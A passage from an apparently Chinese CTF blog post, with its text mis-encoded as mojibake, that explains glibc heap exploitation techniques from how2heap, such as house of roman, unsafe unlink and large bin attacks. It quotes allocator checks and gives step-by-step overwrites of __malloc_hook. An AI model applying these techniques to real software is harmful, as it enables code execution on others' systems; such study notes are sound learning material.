chunk1ï¼Œè¿™é‡Œéœ€è¦è·å–æ ˆä¸Šçš„åœ°å€ï¼Œå¹¶ä¸”å­˜åœ¨ç±»ä¼¼UAFæ¼æ´ä¹‹ç±»çš„æ¥è®¾ç½®bkæŒ‡é’ˆã€‚è®¾ç½®ä¹‹åç°åœ¨smallbiné“¾è¡¨ä¸­ç»“æ„ä¸ºfake chunk2->fake chunk1->chunk_ptrã€‚\n\n(4)ä¹‹åç”³è¯·sizeof(chunk_ptr)ï¼Œå°†ä¹‹ç”³è¯·å‡ºæ¥ï¼Œå†ç”³è¯·ä¸€æ¬¡å³å¯å°†fake chun1ç”³è¯·å‡ºæ¥ï¼Œå®ç°ä»»æ„åœ°å€ç”³è¯·å †å—ã€‚\n\nâ–²æ³¨æ„è¿™é‡Œé’ˆå¯¹smallbinçš„æ”»å‡»æ˜¯ä¸éœ€è¦è®¾ç½®sizeä½çš„ï¼Œä¸å­˜åœ¨è¿™æ–¹é¢çš„æ¡ä»¶ã€‚\n\n \n\n8.house_of_orangeï¼šæ— freeå‡½æ•°çš„æ³„éœ²åœ°å€\n\n(1)ä¿®æ”¹topchunkçš„sizeåŸŸï¼Œä½¿ä¹‹å˜å°ï¼Œä½†éœ€è¦æ»¡è¶³ä¸‹åˆ—æ¡ä»¶ï¼š\n\nâ‘ ä¼ªé€ çš„ size å¿…é¡»è¦å¯¹é½åˆ°å†…å­˜é¡µï¼Œä¾‹å¦‚topchunk_addr+topchunk_size=0x1000*xã€‚\n\nâ‘¡size è¦å¤§äº MINSIZE(0x10)\n\nâ‘¢size è¦å°äºä¹‹åç”³è¯·çš„ chunk size + MINSIZE(0x10)\n\nâ‘£size çš„ prev inuse ä½å¿…é¡»ä¸º 1\n\nç”¨äºé€šè¿‡ä¹‹åæ‹“å±•topchunkçš„sysmallocå‡½æ•°ä¸­çš„ä¸‹åˆ—æ£€æŸ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nassert((old_top == initial_top(av) && old_size == 0) ||\n     ((unsigned long) (old_size) >= MINSIZE &&\n      prev_inuse(old_top) &&\n      ((unsigned long)old_end & pagemask) == 0));\n```\n\n(2)ç”³è¯·ä¸€ä¸ªå¤§äºä¼ªé€ ä¹‹åtopchunk_sizeï¼Œå°äº128K(0x1f400)çš„chunkã€‚å‰è€…æ˜¯ä¸ºäº†è°ƒç”¨sysmallocå‡½æ•°ï¼Œåè€…æ˜¯ä¸ºäº†ä½¿å¾—åˆ†é…æ–¹å¼ä¸ºbrkæ‹“å±•topchunkã€‚\n\nâ‘ brkæ˜¯å°†æ•°æ®æ®µ(.data)çš„æœ€é«˜åœ°å€æŒ‡é’ˆ_edataå¾€é«˜åœ°å€æ¨ï¼ŒåŸå…ˆçš„topchunkè¢«æ”¾å…¥unsortedbinä¸­ï¼Œç„¶åå†ä»æ–°çš„topchunkå¤„å¼€å§‹åˆ†é…ã€‚(ä¸€èˆ¬ä¼šå¾€é«˜åœ°å€æ¨0x21000è¿™ä¹ˆå¤§ï¼ŒåŸºæœ¬å°±æ˜¯å†åŠ ä¸€ä¸ªåˆå§‹topchunkå¤§å°)\n\nâ‘¡mmapæ˜¯åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼ˆå †å’Œæ ˆä¸­é—´ï¼Œç§°ä¸ºæ–‡ä»¶æ˜ å°„åŒºåŸŸçš„åœ°æ–¹ï¼‰æ‰¾ä¸€å—ç©ºé—²çš„è™šæ‹Ÿå†…å­˜ï¼Œè¿™æ ·åŸå…ˆçš„topchunkä¸ä¼šè¢«æ”¾åˆ°unsortedbinä¸­ï¼Œé‚£ä¹ˆå†åˆ†é…å°±æ˜¯ä»è¿™ä¸ªmmapä¸­åˆ†é…ï¼Œæ²¡åŠæ³•æ³„éœ²åœ°å€äº†ã€‚\n\n(3)å†ç”³è¯·ä¸€å—å†…å­˜ï¼Œå°±ä¼šä»unsortedbinä¸­çš„old_topchunkåˆ‡å‰²ï¼Œå¾—åˆ°çš„chunkçš„fdå’Œbkéƒ½å¸¦æœ‰ä¿¡æ¯ã€‚å¦‚æœç¨‹åºæ²¡æœ‰å°†ç”³è¯·çš„chunkå†…å­˜åˆå§‹åŒ–ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ³„éœ²åœ°å€ã€‚å¦å¤–ç”±äºåœ¨æ‰§è¡Œåˆ‡å‰²ä¹‹å‰ï¼Œold_topchunkä¼šè¢«å…ˆæ•´ç†åˆ°smallbinæˆ–è€…largebinä¸­(å…·ä½“çœ‹old_chunkçš„size)ï¼Œæ‰€ä»¥ç”³è¯·å›æ¥çš„chunkä¸­çš„fdå’Œbkçš„å†…å®¹åº”è¯¥æ˜¯å¯¹åº”smallbinæˆ–è€…largebiné“¾è¡¨å¤´çš„åœ°å€ï¼Œä¸æ˜¯unsortedbiné“¾è¡¨å¤´main_aren+88çš„åœ°å€ã€‚è¿™é‡Œéœ€è¦å…·ä½“è°ƒè¯•ä¸€ä¸‹å¥½è®¡ç®—åç§»ï¼Œæ–¹ä¾¿æ³„éœ²åœ°å€ã€‚\n\n \n\n9.house_of_romanï¼šæ— leakçš„åˆ©ç”¨ï¼Œçˆ†ç ´\n\n(1)ç”³è¯·3ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,åˆ†åˆ«ä¸º0x20,0xd0,0x70.(Aç”¨æ¥è§¦å‘å•å­—èŠ‚æº¢å‡ºï¼Œä¿®æ”¹chunkBçš„sizeä½)\n\n(2)åœ¨chunkB+0x78å¤„è®¾ç½®p64(0x61)ï¼Œç”¨æ¥è¿‡æ£€æŸ¥ç”¨çš„ã€‚ï¼ˆ6+7=13(0xd)ï¼‰\n\n(3)é‡Šæ”¾chunkB , chunkBè¿›å…¥unsortedbin , è¿™æ ·chunkBçš„fdå’Œbkå¤„éƒ½æœ‰ main_arena çš„åœ°å€ã€‚\n\n(4)å†æ¬¡åˆ†é… 0xd0 ,ä¼šåˆ†é…åˆ°chunkBã€‚ä»¥ä¸Šæ­¥éª¤éƒ½æ˜¯ä¸ºäº†ä½¿å¾—chunkBä¸­å¸¦ä¸Šmain_arenaçš„åœ°å€ã€‚\n\n(5)å†ç”³è¯·ä¸‰ä¸ª0x70å¤§å°çš„chunkï¼ŒchunkD,chunkE,chunkFï¼ŒchunkFç”¨æ¥å ä½ç”¨ï¼Œé˜²æ­¢è¢«topchunkåå¹¶\n\n(6)é‡Šæ”¾æ‰chunkC,chunkD,ä½¿ä¹‹è¿›å…¥fastbinä¸­ï¼Œä¸ºchunkD->chunkCã€‚\n\n(7)åˆ©ç”¨UAFä¿®æ”¹chunkDçš„fdçš„ä½å­—èŠ‚ï¼Œä½¿å…¶æŒ‡å‘chunkBï¼Œå³å°†0xf0ä¿®æ”¹ä¸º0x20å³å¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n0xn000 chunkA\n0xn020 chunkB\n0xn0f0 chunkC\n0xn160 chunkD\n0xn1d0 chunkE\n0xn240 chunkF\n```\n\nè¿™é‡Œèƒ½å¤Ÿé€šè¿‡æ£€æŸ¥ï¼Œå› ä¸ºå‰é¢å°†chunkBçš„sizeè®¾ç½®æˆäº†0x70ï¼Œå¹¶ä¸”chunkB+0x78å¤„ä¹Ÿè¢«è®¾ç½®æˆäº†0x61ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡fastbinçš„æ£€æŸ¥ã€‚ä¼ªé€ äº†ä¸€ä¸ª0x70çš„chunkã€‚é‚£ä¹ˆ0x70å¤„çš„fastbinå°±å˜æˆchunkD->chunkB\n\n(8)ä¿®æ”¹chunkBçš„fdæŒ‡é’ˆæœ€åä¸¤ä¸ªå­—èŠ‚ä¸º\\xaa,\\xedä½¿å…¶æŒ‡å‘malloc_hook - 0x23å¤„ã€‚è¿™é‡Œå°±éœ€è¦ç”¨åˆ°çˆ†ç ´äº†ï¼Œ\\xaaä¸­çš„ç¬¬ä¸€ä¸ªaæ˜¯ä¸ç¡®å®šçš„ï¼Œæœ‰16ç§å¯èƒ½æ€§ã€‚æ‰€ä»¥ç›´æ¥è®¾ç½®æˆaï¼ŒæˆåŠŸæ¦‚ç‡åº”è¯¥ä¸º1/16ã€‚\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡1.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡2.png)\n\n![img](http://8.131.70.61/wp-content/uploads/2021/02/å›¾ç‰‡3.png)\n\nè€Œè¿™é‡Œéœ€è¦æŒ‡å‘malloc_hook - 0x23çš„åŸå› æ˜¯å› ä¸ºæ—¢è¦åŒ…å«__malloc_hookï¼Œåˆè¦ä½¿å¾—è¿™ä¸ªchunkçš„sizeä½ä¸º0x7fï¼Œè§‚å¯Ÿå†…å­˜å¯å¾—ï¼Œè¿™æ˜¯æœ€ä¼˜é€‰æ‹©ï¼Œé€‰å–çš„æ˜¯_IO_wide_data_0+304è¿™ä¸ªæ•°æ®ä¸­çš„7fï¼Œå…¶å®ƒçš„7féƒ½ä¼šå¸¦ä¸Šå…¶å®ƒçš„æ•°æ®ã€‚\n\n(9)ä¿®æ”¹å®ŒchunkBçš„fdï¼Œå°±åˆæˆåŠŸä¼ªé€ äº†ä¸€ä¸ª0x70å¤§å°çš„chunkï¼Œé‚£ä¹ˆ0x70çš„fastbinä¸­å°±å˜æˆï¼šchunkD->chunkB->malloc_hook - 0x23\n\n(10)ç°åœ¨è¿ç»­ç”³è¯·ä¸‰æ¬¡0x70å¤§å°çš„chunkï¼Œæœ€åä¸€ä¸ªchunkå°±å¾—åˆ°äº†malloc_hook - 0x23å¤„çš„chunkï¼Œé‚£ä¹ˆç°åœ¨å°±å¯ä»¥è®¡ç®—åç§»ä¿®æ”¹malloc+hookçš„å€¼ï¼Œä¿®æ”¹æœ€åä¸‰ä¸ªå­—èŠ‚ï¼ŒåŠ«æŒä¸ºone_gadgetã€‚æœ€å12ä½Bitså¯ä»¥é€šè¿‡å›ºå®šåç§»ç®—å‡ºæ¥ï¼Œä¸ä¼šæ”¹å˜ï¼Œä½†æ˜¯å‰é¢çš„12ä½bitsä¼šæ”¹å˜ï¼Œéœ€è¦çˆ†ç ´ã€‚è¿™é‡Œå¯ä»¥é€šè¿‡åˆšæ‰çš„\\xaaä¸­çš„aæ¥å‡å°‘çˆ†ç ´æ¬¡æ•°ï¼Œ\\xaaä¸­ç¬¬ä¸€ä¸ªaå·²ç»ç¡®å®šï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡åç§»ç®—å‡ºæ¥éšæœºåŒ–ä¹‹åçš„one_gadgetä¸­çš„å€’æ•°ç¬¬äºŒä¸ªå­—èŠ‚ä¸­çš„ç¬¬ä¸€ä¸ª16ä½æ•°ï¼Œè¿™æ ·å°±åªéœ€è¦çˆ†ç ´å€’æ•°ç¬¬ä¸‰ä¸ªå­—èŠ‚å³å¯ã€‚é‚£ä¹ˆæ€»å…±éœ€è¦çš„æ•°å­¦æœŸæœ›å°±åº”è¯¥æ˜¯(0xff+1)*(0xf+1)=4096æ¬¡ã€‚\n\n(11)çˆ†ç ´æˆåŠŸåè¿˜éœ€è¦è§¦å‘__malloc_hookï¼Œé€šè¿‡è¿ç»­freeä¸¤æ¬¡åŒä¸€ä¸ªchunkï¼Œä½¿å¾—mallocæ£€æŸ¥åˆ°é”™è¯¯(ä¸»è¦ä¼šè°ƒç”¨ __libc_message æ¥æ‰§è¡Œabortå‡½æ•°)ã€‚å°±å¯ä»¥è§¦å‘malloc_printerrå‡½æ•°ï¼Œä»è€Œè°ƒç”¨__malloc_hookå‡½æ•°ï¼Œè¿›è€Œgetshellã€‚\n\n \n\n10.house_of_spirit:\n\n(1)é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹æ ˆä¸ŠæŸä¸ªchunkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘ä¸€ä¸ªå¯æ§å†…å­˜çš„æ ˆåœ°å€ï¼Œå†ä¿®æ”¹è¯¥æ ˆåœ°å€å¯¹åº”chunkçš„sizeä½ã€‚\n\n(2)é€šè¿‡ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„sizeç»•è¿‡æ£€æŸ¥ï¼Œç„¶åfreeæ‰è¯¥chunkæŒ‡é’ˆï¼Œå†ç”³è¯·å›æ¥ï¼Œå°±å¯ä»¥æ§åˆ¶ä¸­é—´åŒºåŸŸçš„å†…å®¹äº†ã€‚\n\nfakechunkA  uncontral_data  fakechunkB\n\nä¸­å¿ƒæ€æƒ³å°±æ˜¯å°†ä¸å¯æ§çš„å†…å­˜çº³å…¥ä¸€ä¸ªå¯æ§çš„Chunkä¸­ï¼Œä»è€Œå®ç°å¯æ§ã€‚\n\nâ–²\n\n```\n#æ³¨é‡Šå¤´\n\n//éœ€è¦ç»•è¿‡çš„ä»£ç (_int_freeå‡½æ•°)ä¸­ï¼š\nif (__builtin_expect (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ, 0)\n         || __builtin_expect (chunksize (chunk_at_offset (p, size))\n                 >= av->system_mem, 0))\n```\n\nå³fakechunkAçš„nextchunkï¼Œä¹Ÿå°±æ˜¯fakechunkA+fakechunkA->size = fakechunkBçš„sizeä½æ»¡è¶³å¤§äº2*SIZE_SZï¼ˆ64ä½ç¨‹åºä¸­SIZE_SZä¸º8ï¼‰ï¼Œå°äºav->system_memï¼ˆåœ¨main_arenaä¸­ï¼Œé»˜è®¤ä¸º128kbï¼‰ï¼Œä¸€èˆ¬ç®€å•è®¾ç½®åéƒ½èƒ½æ»¡è¶³ã€‚\n\n \n\n11.large_bin_attack_1ï¼šä»»æ„å¯å†™åœ°å€å†™å †åœ°å€\n\n(1)ç”³è¯·ä¸‰ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,å¤§å°ä¾æ¬¡ä¸º0x80,0x400,0x400ï¼Œå…¶ä¸­è¿˜éœ€è¦æ’å…¥å…¶å®ƒçš„chunké˜²æ­¢åˆå¹¶ï¼Œç„¶åfreeæ‰chunkBï¼Œä½¿å…¶è¿›å…¥unsortedbinã€‚\n\nchunkAç”¨æ¥åˆ†å‰²ï¼ŒchunkBå’ŒchunkCç”¨æ¥æ”¾å…¥largebinä¸­\n\n(2)ç”³è¯·ä¸€ä¸ªå°äºchunkAçš„chunkï¼Œè§¦å‘unsortedbinæ•´ç†ï¼Œå°†chunkBæ•´ç†åˆ°largebinä¸­ã€‚ç„¶åchunkAè¢«åˆ†å‰²æˆchunkA_1,chunkA_2ï¼ŒchunkA_1è¿”å›ç»™ç”¨æˆ·ï¼ŒchunkA_2è¿›å…¥unsortedbinä¸­ã€‚\n\n(3)freeæ‰chunkCï¼Œä½¿å…¶è¿›å…¥unsortedbinä¸­ã€‚\n\n(4)åˆ©ç”¨æ¼æ´ä¿®æ”¹chunkBçš„sizeï¼Œä½¿å…¶å°äº0x410ã€‚\n\n(5)ä¿®æ”¹chunkBçš„bkä¸ºtarget_addr1-0x10ï¼Œbk_nextsizeä¸ºtarget_addr2_0x20ã€‚\n\n(6)åˆ†é…ä¸€ä¸ªæ¯”chunA_2å°çš„chunkï¼Œå†æ¬¡è§¦å‘æ•´ç†ï¼Œå°†chunkCæ•´ç†è‡³largebinä¸­ã€‚\n\n(7)ç”±äºchunkBçš„sizeå°äºchunkCçš„sizeï¼Œæ‰€ä»¥ä¼šå°†chunkCæ’å…¥largebinå¤§å°æ’åˆ—é“¾è¡¨çš„å¤´éƒ¨ï¼Œå³ä»¥ä¸‹ä»£ç ï¼š\n\nâ–²å¤§å°æ’åˆ—é“¾è¡¨çš„ä»£ç èµ‹å€¼è¿‡ç¨‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nvictim->bk_nextsize = fwd->bk_nextsize;\nvictim->bk_nextsize->fd_nextsize = victim;\n```\n\nè¿™é‡Œçš„victimå°±æ˜¯chunkCï¼Œfwdå°±æ˜¯chunkBï¼Œé‚£ä¹ˆfwd->bk_nextsizeå°±ç­‰äºtarget_addr2-0x20ã€‚\n\nâ‘ ç¬¬ä¸€è¡Œä»£ç å°±æ˜¯ï¼š\n\nchunkC->bk_nextsizeè¢«èµ‹å€¼ä¸ºtarget_addr2-0x20\n\nâ‘¡ç¬¬äºŒè¡Œä»£ç å°±æ˜¯ï¼š\n\n(target_addr2-0x20)->fd_nextsizeè¢«èµ‹å€¼ä¸ºchunkC_addrï¼Œç›¸å½“äº\n\n*((target_addr2-0x20)+0x20)=chunkC_addrï¼Œå³*(target_addr2)=chunC_addr\n\nâ–²é‡Šæ”¾é¡ºåºæ’åˆ—é“¾è¡¨çš„ä»£ç èµ‹å€¼è¿‡ç¨‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nbck = fwd->bk;\n// ......\nmark_bin (av, victim_index);\nvictim->bk = bck;\nvictim->fd = fwd;\nfwd->bk = victim;\nbck->fd = victim;\n```\n\nä»¥ä¸Šå°±ç›¸å½“äºæ˜¯*(target_addr1)=chunC_addr\n\nâ˜…ç»¼ä¸Šæ‰€è¿°ï¼Œlargebin attackçš„ç¬¬ä¸€ç§åˆ©ç”¨æ–¹å¼å°±æ˜¯å°†ç›®çš„åœ°å€çš„å€¼ä¿®æ”¹æˆä¸€ä¸ªå †åœ°å€ã€‚\n\n \n\n12.large_bin_attack_2ï¼šå®ç°overlap chunk\n\n(1)ç”³è¯·å››ä¸ªchunkï¼ŒchunkA,chunkB,chunkC,chunkDä¹‹åæ„é€ ä¸€ä¸ªlargebinå¤§å°æ’åˆ—çš„é“¾è¡¨chunkA->chunkBï¼Œå…¶ä¸­chunkAä¸º0x420ï¼ŒchunkBä¸º0x400ï¼ŒchunkCä¸º0x400ï¼Œæœªé‡Šæ”¾ï¼ŒchunkDç”¨æ¥å ä½é˜²æ­¢åˆå¹¶ã€‚\n\n(2)åˆ©ç”¨æ¼æ´å°†chunkBçš„bk_nextsizeä¼ªé€ æŒ‡å‘chunkCï¼ŒåŒæ—¶å°†Cçš„fdä¸bkæ„é€ å¥½ï¼Œå°†Cçš„fd_nextsizeä¸bk_nextsizeèµ‹å€¼ä¸º0ã€‚\n\n(3)å½“å†æ¬¡ç”³è¯·0x410å¤§å°çš„å†…å­˜chunkEæ—¶ï¼Œéå†chunkB->bk_nextsizeä¼šæŒ‡å‘Cï¼Œä¸”Cçš„å¤§å°æ»¡è¶³éœ€æ±‚ï¼Œå› æ­¤ä¼šè°ƒç”¨unlinkå°†chunkCä»åŒé“¾è¡¨å–ä¸‹ï¼Œè¿”å›ç»™ç”¨æˆ·ã€‚\n\n(4)é‚£ä¹ˆç”³è¯·å‡ºæ¥çš„chunkEçš„åœ°å€ä¼šä¸ºchunkCçš„åœ°å€ï¼Œå³chunkEå’ŒchunkCä¸ºåŒä¸€å†…å­˜å—ï¼Œå®ç°overlap chunkçš„æ„é€ ã€‚\n\n \n\n13.mmap_overlapping_chunks:æš‚æ—¶ä¸å¥½æ‰¾\n\n \n\n14.overlapping_chunks:\n\n(1)freeä¹‹å‰ä¿®æ”¹sizeï¼Œåå¹¶é‚»å—è¿›å…¥bin\n\n(2)freeä¹‹åä¿®æ”¹sizeï¼Œåå¹¶é‚»å—ç”³è¯·å‡ºæ¥ã€‚\n\n \n\n15.poison_null_byteï¼šå®ç°overlap chunk\n\n(1)mallocä¸‰ä¸ªchunkï¼ŒchunkA,chunkB,chunkCã€‚\n\n(2)åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡chunkBä¿®æ”¹chunkCçš„pre_sizeä½å’Œpre_inuseä½ï¼Œä½¿å¾—chunkCçš„pre_sizeä½ä¸ºchunkA_size+chunkB_sizeã€‚\n\n(3)freeæ‰chunkCï¼Œæ­¤æ—¶chunkCçš„pre_inuseä½ä¸ºfreeçŠ¶æ€ï¼Œè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†chunkA,chunkB,chunkCä¸€èµ·freeæ‰ã€‚ä»è€Œå®ç°chunkBçš„overlapã€‚\n\nä½†æ˜¯ubuntu16.04æ‰“äº†è¡¥ä¸ï¼Œéœ€è¦ç»•è¿‡æ£€æŸ¥æ‰è¡Œã€‚\n\n \n\n16.unsafe_unlinkï¼šé€šå¸¸å­˜å‚¨chunkçš„ç»“æ„ä½“å…¨å±€æŒ‡é’ˆæ¥è¿›è¡Œunlinkæ”»å‡»ã€‚\n\n(1)æ‰¾åˆ°é¢˜ç›®ä¸­çš„chunklistä½ç½®ï¼Œå¹¶åˆ†æ¸…ç»“æ„ä½“ä¸­æ˜¯sizeåœ¨å‰è¿˜æ˜¯chunkåœ¨å‰ã€‚\n\n(2)è¿™é‡Œå‡è®¾æˆ‘ä»¬æƒ³è¦æ§åˆ¶chunklist[0]ä¸­çš„chunkã€‚ç”³è¯·chunk0,chunk1,chunk2ã€‚åœ¨chunk0ä¸­æ„é€ fakechunkï¼Œå¹¶è®¾ç½®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfakechunk->fd = chunklist_addr-0x18\nfakechunk->bk = chunklist_addr-0x10\n```\n\n(3)é€šè¿‡å †æº¢å‡ºæˆ–è€…off-by-oneå°†chunk1çš„pre_sizeè®¾ç½®æˆfakechunk_sizeï¼Œå°†chunk1çš„sizeè®¾ç½®æˆfakechunk_size+chunk1_sizeã€‚\n\n(4)freeæ‰chunk1ï¼Œè¿™æ ·å°±ä¼šè§¦å‘å‘ä¸Šåˆå¹¶ï¼Œå°†fakechunkå’Œchunk1åˆå¹¶ã€‚åŒæ—¶ï¼Œç”±äºåˆå¹¶è¿‡ç¨‹ä¸­è°ƒç”¨äº†unlinkå‡½æ•°ï¼Œé‚£ä¹ˆchunklist[0].chunkå°±ä¼šæŒ‡å‘chunlist_addr-0x18ï¼Œå¯¹åº”çš„å°±æ˜¯æˆ‘ä»¬çš„chunk0æŒ‡å‘chunklist_addr-0x18ã€‚\n\n(5)ç°åœ¨ä¿®æ”¹chunk0å°±ç›¸å½“äºä¿®æ”¹*(chunklist_addr-0x18)ï¼Œä»è€Œå°†chunk0æŒ‡å‘ä»»æ„åœ°å€ï¼Œåœ¨ä»»æ„åœ°å€å®ç°è¯»å†™ã€‚\n\n \n\n17.unsorted_bin_attackï¼šä»»æ„åœ°å€å†™&main_arena+0x58\n\n(1)åˆ©ç”¨æ¼æ´ï¼Œä¿®æ”¹å¤„åœ¨unsortedbinä¸­å°†è¦è¢«æ‹¿å‡ºæ¥çš„chunkçš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘traget-0x10\n\n(2)ç”³è¯·è¿™ä¸ªå°†è¦è¢«æ‹¿å‡ºæ¥çš„chunkï¼Œä¼šæœ‰å¦‚ä¸‹ä»£ç è¢«è¿è¡Œï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nbck = victim->bk;\n..................................................\n/* remove from unsorted list */\nunsorted_chunks (av)->bk = bck;\nbck->fd = unsorted_chunks (av);\n```\n\nâ‘ ç¬¬ä¸€è¡Œä»£ç ä¸­victimå°±æ˜¯è¯¥chunkï¼Œé‚£ä¹ˆbckå°±ä¼šæŒ‡å‘traget_addr-0x10ã€‚\n\nâ‘¡ç¬¬å››è¡Œä»£ç å°±æ˜¯å°†bckçš„å€¼èµ‹å€¼ç»™unsortedbinçš„bkæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘traget_addr-0x10ã€‚\n\nâ‘¢ç¬¬äº”è¡Œä»£ç å°±æ˜¯å°†unsortedbinçš„åœ°å€èµ‹å€¼ç»™bck->fdï¼Œä¹Ÿå°±æ˜¯*(target_addr-0x10+0x10)è¢«èµ‹å€¼ä¸ºunsortedbinçš„åœ°å€ï¼Œå³&main_arena+0x58ã€‚\n\nâ˜…ç»¼ä¸Šï¼Œunsortedbin attackå°±æ˜¯å°†ä»»æ„åœ°å€å¤„çš„å€¼ä¿®æ”¹æˆ&main_arena+0x58ã€‚\n\nâ–²ä¸€èˆ¬unsortedbin attackæ˜¯ç”¨æ¥é…åˆfastbin attackæ¥ä½¿ç”¨çš„ã€‚å› ä¸ºfastbin attackéœ€è¦ä¼ªé€ fakechunkçš„sizeï¼Œä½¿å…¶ç­‰äº0x71æˆ–0x7fç”¨æ¥ç»•è¿‡æ£€æŸ¥.é‚£ä¹ˆè¿™æ—¶å€™å°±å¯ä»¥ç”¨åˆ°unsortedbin attackä»»æ„åœ°å€å†™&main_arena+0x58è¿™ä¸ªæŠ€å·§äº†ï¼Œå¯ä»¥ä½¿å¾—fakechunkçš„sizeç­‰äº0x7fï¼Œä»è€Œç»•è¿‡æ£€æŸ¥ã€‚\n\n \n\n18.unsorted_bin_into_stackï¼š\n\n(1)åˆ©ç”¨æ¼æ´ï¼Œä¿®æ”¹unsortedbinä¸­ä½äºé“¾è¡¨å°¾éƒ¨çš„chunk_lastçš„bkæŒ‡é’ˆä½¿å…¶æŒ‡å‘æ ˆä¸Šä¼ªé€ çš„ä¸€ä¸ªfakechunkï¼Œä½¿å…¶sizeä¸ç­‰äºåŸå…ˆunsortedbinä¸­chunk_lastçš„sizeã€‚\n\n(2)ç”³è¯·fakechunkçš„sizeå¤§å°çš„chunkï¼Œä»unsortedbiné“¾è¡¨å°¾éƒ¨çš„chunkå¼€å§‹æŸ¥æ‰¾ï¼Œé¦–å…ˆchunk_lastçš„sizeä¸ç¬¦åˆï¼Œæ¥ç€æŸ¥æ‰¾chunk_last->bkï¼Œä¹Ÿå°±æ˜¯fakechunkï¼Œå‘ç°sizeç¬¦å·ï¼Œé‚£ä¹ˆå°±è¿”å›è¯¥fakechunkç»™ç”¨æˆ·ã€‚\n\nè¿™é‡Œçš„fakechunkå°±å¯ä»¥ä¼ªé€ åˆ°æ ˆä¸Šï¼Œä»è€Œæ§åˆ¶æ ˆä¸ŠåŸå…ˆä¸å¯æ§çš„å†…å®¹ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nctfwiki\n\nhttps://github.com/shellphish/how2heap\n\nhttps://bbs.pediy.com/thread-259269.htm#msg_header_h2_12\n","tags":["how2heap"],"categories":["PWN","how2heap"]}]